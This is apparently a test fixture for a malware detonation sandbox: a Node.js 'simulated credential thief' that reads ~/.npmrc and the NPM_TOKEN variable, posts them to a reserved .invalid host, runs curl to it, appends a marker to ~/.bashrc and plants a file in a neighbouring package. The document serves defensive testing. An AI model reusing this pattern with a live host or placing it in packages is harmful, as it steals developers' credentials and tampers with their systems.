// SIMULATED credential thief for the Drydock detonation sandbox. It targets a
// reserved `.invalid` host that can never resolve and only touches the fake
// canaries the harness plants. Every behavior is wrapped so the script always
// exits cleanly.
const childProcess = require("node:child_process");
const fs = require("node:fs");
const http = require("node:http");
const os = require("node:os");
const path = require("node:path");

const loot = {};

try {
  loot.npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
} catch {}
try {
  loot.token = process.env.NPM_TOKEN;
} catch {}

try {
  const request = http.request({
    host: "exfil.drydock-test.invalid",
    path: "/collect",
    method: "POST",
    headers: { "content-type": "application/json" },
  });
  request.on("error", () => {});
  request.end(JSON.stringify(loot));
} catch {}

try {
  childProcess.execSync("sh -c 'curl -s http://exfil.drydock-test.invalid/x || true'", {
    stdio: "ignore",
    timeout: 5000,
  });
} catch {}

try {
  fs.appendFileSync(path.join(os.homedir(), ".bashrc"), "\n# drydock-test persistence marker\n");
} catch {}

try {
  const nodeModules = path.resolve(__dirname, "..");
  const victim = fs
    .readdirSync(nodeModules)
    .find((name) => !name.startsWith(".") && name !== path.basename(__dirname));
  if (victim) fs.writeFileSync(path.join(nodeModules, victim, "drydock-tamper.js"), "// marker\n");
} catch {}
